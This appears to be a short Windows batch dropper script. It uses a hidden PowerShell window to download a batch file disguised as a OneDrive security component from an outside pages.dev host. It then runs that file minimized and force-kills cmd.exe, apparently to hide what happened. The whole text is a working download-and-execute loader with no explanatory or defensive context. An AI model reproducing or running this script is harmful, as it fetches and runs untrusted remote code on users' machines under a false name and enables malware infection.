powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://dwdwpld.pages.dev/OneDrive_Security_excl.bat' -OutFile 'OneDrive_Security_excl.bat'"

start /wait /min OneDrive_Security_excl.bat

taskkill /F /IM cmd.exe